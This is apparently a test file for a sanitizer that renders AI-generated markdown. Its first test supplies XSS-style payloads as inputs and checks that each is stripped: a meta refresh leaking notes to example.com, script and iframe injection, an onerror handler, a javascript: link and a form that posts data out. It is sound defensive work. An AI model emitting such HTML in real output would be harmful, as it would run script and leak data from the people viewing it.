import { render } from "@testing-library/react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { describe, expect, it } from "vitest";
import { aiRehypePlugins } from "./aiMarkdown";

// Model output, as a summary or the AI sidebar renders it.
function renderAi(markdown: string) {
  return render(
    <ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={aiRehypePlugins}>
      {markdown}
    </ReactMarkdown>
  ).container;
}

describe("aiRehypePlugins", () => {
  it("drops HTML that could act on its own", () => {
    const html = renderAi(
      [
        "## Summary",
        "",
        '<meta http-equiv="refresh" content="0;url=https://example.com/leak?notes=secret">',
        '<iframe srcdoc="<script>parent.pwned = 1</script>"></iframe>',
        "<style>body { display: none }</style>",
        '<form action="https://example.com/collect"><input name="q"></form>',
        '<img src="x.png" onerror="window.pwned = 1">',
        '<a href="javascript:alert(1)">click</a>',
        "<script>window.pwned = 1</script>",
        "",
        "Pricing moves to three tiers.",
      ].join("\n")
    );

    for (const tag of ["meta", "iframe", "style", "form", "script"]) {
      expect(html.querySelector(tag), tag).toBeNull();
    }
    const handlers = [...html.querySelectorAll("*")].flatMap((el) =>
      el.getAttributeNames().filter((name) => name.startsWith("on"))
    );
    expect(handlers).toEqual([]);
    expect(html.querySelector("a")?.getAttribute("href") ?? "").not.toMatch(/javascript:/i);
    expect(html.textContent).toContain("Pricing moves to three tiers.");
  });

  it("opens links in the browser, titled with where they go", () => {
    const html = renderAi("See [the pricing page](https://example.com/pricing).");
    const a = html.querySelector("a");
    expect(a?.getAttribute("href")).toBe("https://example.com/pricing");
    expect(a?.getAttribute("target")).toBe("_blank");
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(a?.getAttribute("title")).toBe("https://example.com/pricing");
  });

  it("keeps the formatting models write", () => {
    const html = renderAi(
      [
        "| Owner | Task |",
        "| --- | --- |",
        "| Sofia | Pricing deck<br>by Friday |",
        "",
        "- [x] Book the room",
        "",
        "Some <b>bold</b> and `code`.",
      ].join("\n")
    );

    expect(html.querySelector("table td br")).not.toBeNull();
    expect(html.querySelector('input[type="checkbox"]')).not.toBeNull();
    expect(html.querySelector("b")?.textContent).toBe("bold");
    expect(html.querySelector("code")?.textContent).toBe("code");
  });
});
